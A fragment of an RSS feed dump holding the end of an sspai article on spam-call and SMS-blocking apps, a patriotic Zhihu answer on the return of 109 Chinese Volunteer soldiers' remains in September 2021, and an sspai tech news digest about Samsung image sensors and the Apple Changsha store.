ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/53c30f88a83cd687e4b8e1966daf2721\"><figcaption>CC 来电拦截 N+、短信精灵、通知滤盒</figcaption></figure><p>CC 来电拦截 N+ 使用 Android <a href=\"https://source.android.com/devices/tech/connect/block-numbers\" target=\"_blank\">BlockedNumberProvider</a> API 接口进行来电识别与拦截，系统要求 Android 7.0 以上版本。目前作者失联，离线数据库暂时无法更新，根据他人转述作者原话，「离线数据库无法更新不影响拦截功能，拦截功能更依靠自己制作的规则」。具体的使用体验可以阅读这篇文章<a href=\"https://sspai.com/post/62868\" target=\"_blank\">《给「原生」Android 用户的骚扰电话拦截：CC 来电拦截 N+ 》</a>。</p>\n<blockquote>\n<p>经过近两周的使用后，最为显著的变化就是我几乎很难再收到那些奇奇怪怪的骚扰电话了，实际效果上，CC 来电拦截 N+ 让我最满意的地方就是骚扰的瞬间拦截（电话铃声响之前就已经被拦截并弹出通知），再也不用等铃声响起后再选择是否挂断电话。</p>\n<p>如果你是和我一样的原生 / 类原生 Android 用户，CC 来电拦截 N+ 或许正是你一直以来都需要的那一款。</p>\n</blockquote>\n<p>短信精灵是第三方的短信应用，基于 <a href=\"https://github.com/moezbhatti/qksms\" target=\"_blank\">QKSMS</a> 进行制作，除了基本的短信接收、发送，App 还支持短信通知的快捷操作、自定义主题、关键词拦截、数据备份功能，以及针对 Android Wear 进行特殊优化。</p>\n<blockquote><p>感谢 <a href=\"https://sspai.com/u/LuZhNan/posts\" target=\"_blank\">@路中南</a> 提供内容</p></blockquote>\n<p>通知滤盒严格意义上来说并不只针对短信通知，而是针对 Android 手机上所有带有文本的通知。从这个角度来看，不管是骚扰短信，还是电商平台 App 的垃圾推送，都在其拦截范围内。虽然通知滤盒的拦截原理为匹配关键字，不支持语义识别或是机器学习，也能有效过滤垃圾推送，可以应用在需要保留应用通知权限、但应用会不时发送垃圾推送的场景。</p>\n<p>最大的弊端也许是通知滤盒只能够进行一个形式上的拦截，而无法根除骚扰问题。比如在 Android 7.0 以上的系统中支持短信快捷操作 —— 已读、删除、复制验证码，通知滤盒只会针对通知进行屏蔽，最多帮你多按一下「已读」或者是「删除」（如果通知互动操作内有的话），并不会干预短信本身的收发流程。</p>\n<h2>熊猫吃短信、落格信使</h2>\n<p>应用下载地址：</p>\n<span class=\"ss-application\" app-id=\"13079\"> </span><span class=\"ss-application\" app-id=\"14291\"> </span><p>熊猫吃短信通过 Core ML 框架使用已有模型，通过语义识别将短信分为交易信息、推广信息与垃圾信息进行过滤。除去用户主动上传短信样本的情况，App 会一直保持离线运行，保证隐私安全。</p>\n<p>拦截模型是根据开发者偏好进行训练的，对于一些界限比较模糊的短信，如优惠、促销信息，开发者是一律标记为骚扰短信，但有些人可能不反感收到此类通知，可自行取舍。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/38b6af6f88dfa1ac94846c1573c6651d\"><figcaption>熊猫吃短信</figcaption></figure><p>落格信使与熊猫吃短信相比，会更偏技术风多点。落格信使采用正则表达式匹配关键词方案进行短信过滤，详细介绍可阅读这篇文章《<a href=\"https://sspai.com/post/41146\" target=\"_blank\">可以高度自定义规则的短信拦截应用：落格信使</a>》</p>\n<p>由于没有内置拦截规则，用户可根据自己偏好来创建，比如拦截含有「TD、在线发稿、五星好评」等字眼的短信，需要长时间地去维护。当然，在 App 中也提供了「对数云」，用以上传自己的规则，或下载他人共享的处理规则。同类型的产品还有 Sifter，可自行选择使用哪一款 App。</p>\n<h2>国家反诈中心</h2>\n<span class=\"ss-application\" app-id=\"16156\"> </span><p> </p>\n<p>「国家反诈中心」是由公安部刑事侦查局组织开发的一款预防诈骗、举报诈骗的应用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/5f7283cfa500f37d1d664b9061ad8f6f\"><figcaption>国家反诈中心</figcaption></figure><p>除了防范诈骗电话拨入，App 里还提供了丰富的防诈骗知识，用户通过学习其中的知识可以有效避免各种网络诈骗的发生，提高防骗能力，还可以向平台举报各种诈骗信息，减少不必要的财产损失。</p>\n<h2>尾言</h2>\n<p>以上为 Android 与 iOS 系统骚扰信息与来电的拦截方法介绍，但光从用户端预防，治标不治本。《通信短信息服务管理规定》颁布已经 5 年了，运营商与企业一次次被有关部门约谈，「铁拳」打在企业家身上却只有短痛，商家们的推销方法不断升级，用户防不胜防。究竟何时，才能还用户「一片清静」？</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://m.jiemian.com/article/2605678.html\" target=\"_blank\">浅析综合整治骚扰电话专项行动对利益相关方的影响</a></li>\n<li><a href=\"https://www.kexinhaoma.org/Page/Content?id=429\" target=\"_blank\">2020 年度骚扰电话形势分析报告</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n","link":"https://sspai.com/post/68502"},{"title":"109 名烈士终于回家，这是最好的开学第一课。从他们身上你感受到了什么？有什么想对他们说的 ？","date":"2021-09-03 03:10:00","description":"\n<p>9月2日，<b>是109名士兵回家的日子，第八批在韩志愿军烈士遗骸回国。</b></p>\n<p>遗骸迎回仪式，在沈阳桃仙国际机场举行。</p>\n<p>出征七十一年，落叶终于归根。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4b46c61acb343092f5db21485da893c8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"715\" data-rawheight=\"896\" data-watermark=\"watermark\" data-original-src=\"v2-4b46c61acb343092f5db21485da893c8\" data-watermark-src=\"v2-93b551b1f1c575fd3ebc62e9ddcf4aa8\" data-private-watermark-src=\"v2-c6d7afc189146b5370f6e62d053b0203\"></p>\n<p><b>9月1日，是孩子们开学的日子。</b></p>\n<p>并不是故意安排，却来得恰到好处。</p>\n<p><b>是时候了，让中国的孩子多一点血性，让中国的孩子多一点民族气节，让中国的孩子记住国家的英雄。</b></p>\n<p><b>这是给中国孩子最好的开学第一课。</b></p>\n<p><br></p>\n<p><b>01、回家</b></p>\n<p>从韩国仁川机场到中国沈阳桃仙机场，<b>回家的路是1小时25分钟，他们走了71年</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f8e9196313df9905b6fcf574a0aa50d2_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"351\" data-watermark=\"watermark\" data-original-src=\"v2-f8e9196313df9905b6fcf574a0aa50d2\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-239c3f85bd3815295634931332aa0a5a_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"586\" data-rawheight=\"322\" data-watermark=\"watermark\" data-original-src=\"v2-239c3f85bd3815295634931332aa0a5a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>9月2日上午，<b>109位志愿军烈士遗骸，及1226件相关遗物回到祖国。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-06529dc21777c7b18be474a205f35b9f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-06529dc21777c7b18be474a205f35b9f\" data-watermark-src=\"v2-0d1f55159d5b3b4a15e88ad35dc511e6\" data-private-watermark-src=\"v2-950fa53c6dc96e1a3409f790f01eaaef\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b300529e264df333384d397398bca865_720w.jpg?rss\" data-caption=\"12时37分，志愿军烈士遗骸迎回仪式在沈阳桃仙国际机场举行。退役军人事务部部长孙绍骋主持\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"734\" data-watermark=\"watermark\" data-original-src=\"v2-b300529e264df333384d397398bca865\" data-watermark-src=\"v2-1e3f5cc674b8d6de61d53cafa75216c4\" data-private-watermark-src=\"v2-acf91c9da9f0c1bdb2d7c879def311b8\"></p>\n<p>这条回家路走的很难。</p>\n<p>71年来，197653名牺牲在异乡的志愿军将士，都在等着回家与亲人“再会”。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-df82e1b6fa2908f0cf58b4529677f519_720w.jpg?rss\" data-caption=\"志愿军烈士遗物\" data-size=\"normal\" data-rawwidth=\"590\" data-rawheight=\"424\" data-watermark=\"watermark\" data-original-src=\"v2-df82e1b6fa2908f0cf58b4529677f519\" data-watermark-src=\"v2-30441598b3a3136d70baa0aee7532917\" data-private-watermark-src=\"v2-40f8329f17d025efeda2d6a4931fa048\"></p>\n<p>2013年6月，中韩经协商敲定，如果发现新的中国军人遗骸，每年定期归还中方，从2014年到2021年，共有8批共825名在韩志愿军烈士遗骸回国。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-56a0a70f4cb1308d73ba777fb2d8dbfd_720w.jpg?rss\" data-caption=\"第一批志愿军烈士遗骸归国\" data-size=\"normal\" data-rawwidth=\"641\" data-rawheight=\"727\" data-watermark=\"watermark\" data-original-src=\"v2-56a0a70f4cb1308d73ba777fb2d8dbfd\" data-watermark-src=\"v2-67afb6a2a961f83cb0f26e648da84595\" data-private-watermark-src=\"v2-d2883dad12746a7eea7821ec4db77b65\"></p>\n<p>离家时尚是少年，身后是刚刚建立的新中国。</p>\n<p>冲锋陷阵，视死如归。</p>\n<p>归来时骸骨盖着国旗，让人泪目，也让人心疼。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d8af5785dfe5f2c5c06c2c4b08aa4524_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"486\" data-watermark=\"watermark\" data-original-src=\"v2-d8af5785dfe5f2c5c06c2c4b08aa4524\" data-watermark-src=\"v2-9e17b2279890ff8f4e3377d8099c817b\" data-private-watermark-src=\"v2-6a03e6c03ad8b1e2dc59175e9f1bd389\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-ce20aee68363beae5e5db56803e89a16_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"486\" data-watermark=\"watermark\" data-original-src=\"v2-ce20aee68363beae5e5db56803e89a16\" data-watermark-src=\"v2-f826c2248ed38a3dc8f8a48c09e15f5e\" data-private-watermark-src=\"v2-14bb5a9cbe6d510104333ff755393620\"></p>\n<p><br></p>\n<p>71年前他们告别的祖国如今早已山河无恙。</p>\n<p><b>这些故事，我们想让中国的孩子知道，眼前的繁华盛世，是一代又一代的先辈用生命换来的。</b></p>\n<p><br></p>\n<p><b>02、197653</b></p>\n<p>1950年10月19日，在鸭绿江畔，一支中国军队在黄昏中奔向遥远的战火。</p>\n<p>同一天，平壤被“联合国军”占领。局势到了最危急的时刻。</p>\n<p>“打得一拳开，免得百拳来”。于是，一次震惊世界的远征开始了。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b03a0f2e9402c415ed0880cd8c90db3d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"760\" data-rawheight=\"430\" data-watermark=\"watermark\" data-original-src=\"v2-b03a0f2e9402c415ed0880cd8c90db3d\" data-watermark-src=\"v2-617166320237e09cd08a40c8da91a530\" data-private-watermark-src=\"v2-bfb691121f983f69a00cd73e9fb9f2fb\"></p>\n<p>1950的中国，人均寿命35岁。人均钢铁产量只够打一把镰刀。这样一个亟待建设的国家，用她最优秀的儿女，去和当时世界装备最先进的军队决死一战。</p>\n<p>并且只用了三年时间把他们打到了谈判桌上。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8a8d2fad8b71330f7f443e80dd9ebf10_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"787\" data-rawheight=\"561\" data-watermark=\"watermark\" data-original-src=\"v2-8a8d2fad8b71330f7f443e80dd9ebf10\" data-watermark-src=\"v2-a2b251a3cf98a529fa9be42051ace7b5\" data-private-watermark-src=\"v2-16368dc6f47fef3a17dfb49127c3da42\"></p>\n<p><b>志愿军突破汉江防线</b></p>\n<p>然而，在鸭绿江畔留下背影的士兵中<b>有197653人再也没能踏上祖国的土地。</b></p>\n<p>这背后有多少奋不顾身的抉择，<b>这背后有多少生死决别的故事，我们想让中国的孩子知道。</b></p>\n<p><br></p>\n<p><b>03、礼遇</b></p>\n<p>各大媒体全程报道、全程直播，不落下英雄回家的任何一个细节，各个热搜榜都有他们的身影。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-a6b6cb65079c192f0ac5ffd5f2f6162f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"1415\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>这让人感到欣慰，<b>国家的英雄，国家给予最高的礼遇。</b><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-77399a9ebaf27599923dafaacc9c62a5_720w.jpg?rss\" data-caption=\"国产运输机“鲲鹏”运-20全程护送\" data-size=\"normal\" data-rawwidth=\"856\" data-rawheight=\"584\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><b>深深的敬意藏在用心的细节里，</b>此次空军派出的运-20专机，<b>编号为08</b>特意为迎接第八次志愿军烈士遗骸归国准备。<br><br>运-20专机的机舱内部，特别安装了用于固定棺椁的装置，在每一个固定位的四周都加装了缓冲材质保证棺椁不被磕碰。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-878ca352ac49f288880dba0fa6502fc4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"608\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-40112f9ab7fcc42d879215685175fe30_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>进入中国境内之后，中国空军的两架歼-11B战机伴飞护航。运-20与歼-11B飞行员在空中有一段对话让人破防<b>“奉命接迎志愿军烈士遗骸回国！”“欢迎志愿军忠烈归国我部歼-11B飞机两架奉命全程护航！”</b><br><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0b3fdacb3eb11e0c5637e6b17cd3351f_720w.jpg?rss\" data-caption=\"歼-11B战机超低空拉烟飞过\" data-size=\"normal\"></p>\n<p><br>回到70年前，1951年5月，抗美援朝战争进入相持阶段。人民空军开始以师为单位轮番入朝作战，成立不足两年的“雏鹰”要和世界最强空军争夺制空权，这是空战史上力量最悬殊的对决之一。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-3b655fd2bab07e27f31fb1fcc4de89ef_720w.jpg?rss\" data-caption=\"首批参战的志愿军空军第4师第10团28大队\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"402\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>战争初期，美国在朝鲜投入飞机1200多架，而我空军作战飞机不足200架，比例为6:1。美军飞行员平均飞行时间1000小时，我军飞行员飞行时间最多也不到100小时，整体比例约为30:1。<br><b>如今，一支强大的人民空军护佑着我们的国家，可以打败一切来犯之敌。</b><br>正如空军航空兵某师参谋长丁毅，所说——<b>这是大国空军战略核心投送能力的实际体现。</b></p>\n<p><br><b>每思祖国金汤固，忆英雄铁甲寒。</b><br></p>\n<b></b><p><img src=\"https://pic1.zhimg.com/v2-f342c0e0562ea28a87cee13bb9388f73_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"779\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><b>我们想让中国的孩子知道，如今的中国有一支强大的人民军队，这是我们自信的来源。我们想让中国的孩子知道，每一个中国的年轻人，都有义务去保护这个国家。</b></p>\n<p><br></p>\n<p><b>04、永远年轻</b></p>\n<p><b>他们不再变老，</b>那些年轻的生命那些不为人知的名字为了身后的国家，视死如归。<br><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c639cd3b60c9993d006188ee08d2b7be_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-8068fcbae9d4e46b732190e5c3cddcc5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><br>而我要做的，是记住他们。我们若记得，他们便无悔<br><br><b>一位健在的志愿军战士说“那年我17岁，我没准备活，我们大家都准备死的”<br></b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-9ddea46c462ab1f7a6abe6551d87e0d9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\"></p>\n<p><br>如此青春的年纪如此慷慨的誓言，当之无愧，最可爱的人。<br><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b0c220cab7d76291751e7ff341894549_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"608\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-a45be011d33026d2771b758c35a92bcd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"613\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><b>“你问我年轻是什么样子，我说和你一样啊”</b><br>和你一样的年纪，和你一样爱笑，和你一样意气风发。<br>我们想让中国的孩子认识，这些最可爱的人，知道他们的名字，知道他们的故事，知道青春除了诗和远方，还有家国和边关。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ecfaea245bee721660a83a65a9d835c4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"400\" data-rawheight=\"484\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>当天，哨位君也在迎接仪式的现场，无数次泪目，无限感慨感觉时空转换。<br>哨位君的爷爷也是一位抗美援朝老兵，曾在朝鲜战场荣立二等功，眼前归来的是他并肩战斗的战友。<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-fb590d24b473eee9a35abefba31d7bfd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"550\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>在沈阳抗美援朝烈士陵园门口，有一面留言墙，是退役军人事务部宣传中心所立<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5f61db159f319ce3be8c1b928bd23010_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1439\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>上面写满了大家给烈士们的留言，哨位君也留了一句话，是敬意、是怀念、是哀悼，也是无尽的感恩。<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e28b0c97c13d34dabb8ff097b2e2f091_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>9月3日是志愿军烈士遗骸的安葬仪式，这个日子很巧合是抗日战争胜利日。再过半个月是九一八事变90周年纪念日，再过27天是烈士纪念日，再过28天是国庆节。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f747e4e23e3edf779a7d19ea806bc843_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><b>这一切都在告诉我们，告诉中国的孩子，如今山河无恙是先辈用生命换来的。</b></p>\n<p><b>总有人正在年轻，而今的中国，要看我们了。</b></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yihao-shao-wei-11?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">一号哨位</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/484341681/answer/2100338292?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">325 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/452226885?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">身边认识的人家中曾经出过烈士和英雄是一种怎样的体验？他们曾经有哪些感人的事迹或故事？</a><br><a href=\"http://www.zhihu.com/question/482921104?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9月2日，第八批在韩志愿军烈士遗骸运送回国，哪些志愿军的事迹令你印象最深，我们该如何铭记他们？</a><br>\n","link":"http://www.zhihu.com/question/484341681/answer/2100338292?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：三星推出两款移动图像传感器、Apple 长沙将于本周六开幕","date":"2021-09-03 00:50:44","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>三星推出两款移动图像传感器</h3>\n<p>三星于 9 月 1 日正式发布两款移动图像传感器 ISOCELL HP1 以及 ISOCELL GN5，其中 ISOCELL HP1 是目前业界首款支持 200MP 的移动图像传感器，整体尺寸属于 1/1.22” 型，单个像素仅有 0.64μm，并采用 ChameleonCell 技术，可根据环境使用 2×2、4×4 或者全像素输出。在低照度环境下，ISOCELL HP1 可以将临近的 16 个像素合并输出成一张 12.5MP 的图像。</p>\n<p>ISOCELL GN5 则是一款 1/1.5” 型，分辨率为 50MP 的移动图像传感器，支持 Dual Pixel Pro 技术，该技术在传感器的每个 1μm 像素内水平或垂直放置两个业内最小的光电二极管，以实现针对横向和纵向纹理的相位对焦。两款感器均支持 8K 视频录制、 Staggered HDR 以及 Smart-ISO Pro 技术，后者支持输出 12bit 色深图像。<a href=\"https://www.samsung.com/semiconductor/minisite/isocell/newsroom/pressrelease/samsung-brings-advanced-ultra-fine-pixel-technologies-to-new-mobile-image-sensors/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4omublb34t813bf0v20.png\"></figure><h3>Apple 长沙将于本周六开幕</h3>\n<p>9 月 2 日，Apple 更新官网信息，正式宣布长沙零售店于 9 月 4 日上午 10 点开业，新零售店位于长沙国金中心商场。据悉，Apple 长沙使用了新的玻璃幕墙技术，能根据时间和四季自动变换不同的外观，这也是首家使用这项技术的 Apple 零售店。<a href=\"https://www.apple.com.cn/newsroom/2021/09/apple-changsha-opens-saturday-in-china/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/03/article/941365aacbcd633afd8f67785a52e42d\" alt=\"位于国金中心的 Apple 长沙正门，面对黄兴路。\"></figure><h3>罗技公布 Logi Bolt 无线技术</h3>\n<p>9 月 1 日，罗技正式公布其 Logi Bolt 无线技术，该技术相较于目前的普通技术来说，具备更高的安全性以及性能，且能应用于复杂的无线环境中同时与多台设备进行连接。与此同时，官方也表示在最新一代的 MX Master 以及 Ergo 系列中均将配备 Logi Bolt 技术。<a href=\"https://www.logitech.com.cn/zh-cn/products/mice/logi-bolt-usb-receiver.html\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4omuc5b34t818p9ao00.jpeg\"></figure><h3>微软更新 Windows Insider 政策</h3>\n<p>9 月 2 日，微软更新 Windows Insider 策略信息，用户如果在不支持 Windows 11 硬件配置的电脑上进行 Windows 11 的测试，即使加入了 Dev 频道，也将收到微软的警告信息提醒用户重新安装 Windows 10。<a href=\"https://mspoweruser.com/microsoft-is-booting-windows-11-insiders-with-non-compliant-pcs-back-to-windows-10/amp/#click=https://t.co/Ai58J94cjx\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4omucdb34t82dsrfmng.jpeg\"></figure><h3>高通推出 aptX lossless 蓝牙无损音频技术</h3>\n<p>高通于 9 月 1 日正式宣布推出 aptX lossless 无损蓝牙音频技术，该技术属于 aptX Adaptive 技术下扩展的新功能，同时也是其 Snapdragon Sound 计划的一部分。根据高通提供的技术参数，该技术将拥有 1Mbps 的频宽，提供 CD 品质的 16-bit 44.1kHz 无损音频，同时还支持 24-bit 96kHz 高解析度音频的有损压缩传输，两种模式可以进行切换，而首批支持该技术的设备将会在 2022 年上市，包括蓝牙耳机产品以及对应的 Android 手机设备。<a href=\"https://www.qualcomm.com/news/releases/2021/09/01/qualcomm-adds-bluetooth-lossless-audio-technology-snapdragon-sound\" target=\"_blank\">来源</a></p>\n<h3>任天堂发布 Switch 脑筋急转弯小游戏</h3>\n<p>9 月 2 日，任天堂官方发布推特宣布即将发售 Big Brain Academy：Brain vs. Brain，该游戏是一类似于图片类脑筋急转弯的小游戏，预计 12 月 3 日正式开放下载，售价 29.99 美元。<a href=\"https://mobile.twitter.com/NintendoAmerica/status/1433414764219207683?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1433414764219207683%7Ctwgr%5E%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.theverge.com%2F2021%2F9%2F2%2F22653863%2Fnintendo-big-brain-academy-vs-switch-multiplayer-release-date-price\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4omuctb34t82dsrfmo0.png\"></figure><h3>微信 iOS 8.0.13 正式版更新</h3>\n<p>微信 iOS 平台于 9 月 2 日正式发布 8.0.13 更新，本次更新中新消息通知设置中新增了「视频号和直播推送」开关，另外 iPad 上支持同屏的窗口多开。<a href=\"https://www.ithome.com/0/573/099.htm\" target=\"_blank\">来源</a></p>\n<h2>看看就行的小道消息</h2>\n<ul>\n<li>据相关媒体报道称，Apple 在印度同样面临反垄断挑战，相关诉讼由非盈利组织发起，该组织认为 Apple 高达 30% 的收费提高了应用开发者和用户的成本，损害了行业竞争。目前印度竞争委员会并未公开案件的文件和相关细节，Apple 也没有对此进行回应。<a href=\"https://www.ithome.com/0/573/035.htm\" target=\"_blank\">来源</a>\n</li>\n<li>据 Drone Modelismo 爆料，DJI Mavic 3 将采用不同的设计，配备与哈苏公司合作的主摄像头以及广角镜头，并内置 1TB 存储空间和 6000 mAh 电池。<a href=\"https://m.youtube.com/watch?v=99beVokxjd0\" target=\"_blank\">来源</a>\n</li>\n<li>据外媒透露，因全球芯片短缺持续，Apple 预计今年推出的两款搭载 mini-LED 的 MacBook Pro 或将推迟发布。<a href=\"https://m.ithome.com/html/573044.htm\" target=\"_blank\">来源</a>\n</li>\n<li>据外媒 The Information 的报道称，Apple 首款 AR/VR 设备已经完成物理设计，相关芯片已经开始试产。相关 AR 芯片由 Apple 自己定制，拥有更好的无线传输、数据解压缩功能，但由于缺少机器学习以及神经网络引擎功能，因此 AR/VR 设备需要连接到 iPhone 才能使用全部功能。<a href=\"https://appleinsider.com/articles/21/09/02/apples-first-arvr-headset-will-need-to-be-connected-to-an-iphone\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>🎁 会员周边我们已经准备好了，将于下周一（9 月 6 日）起<strong>陆续</strong>发货，会员可以在 <a href=\"https://sspai.com/prime/subscription\" target=\"_blank\">这里</a> 查看之前填写的收件地址，如需变更收货地址可以在周日（9 月 5 日） 23:59 前填写 <a href=\"https://jinshuju.net/f/sz5L5X\" target=\"_blank\">这份表单</a>。</li>\n<li>✒️️ Android 平台优质写作工具「纯纯写作」开学季促销，欢迎前往 <a href=\"https://sspai.com/item/48#184\" target=\"_blank\">少数派正版软件商城</a> 下单。</li>\n<li>🧸 少数派会员通讯《<a href=\"https://sspai.com/prime/precog/vol07-pre-talk-about-notes\" target=\"_blank\">笔记大战</a>》已经上线，来看看他们的笔记工具方法论吧！</li>\n<li>📕 由少数派编辑部联合优秀作者出版的实体书《数字时代的效率手册》上线电商平台，<strong>少数派预购会员将免费获赠该书</strong>。<a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单 &gt;</a>\n</li>\n<li>📡 你会在日常生活中使用 5G 网络吗？去 <a href=\"https://sspai.com/bullet/1628500218\" target=\"_blank\">一派</a> 和大家聊聊。</li>\n</ul>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/68539\" target=\"_blank\">📧 一日一技 | 防治骚扰邮件，我们可以从这些方面入手</a></li>\n<li><a 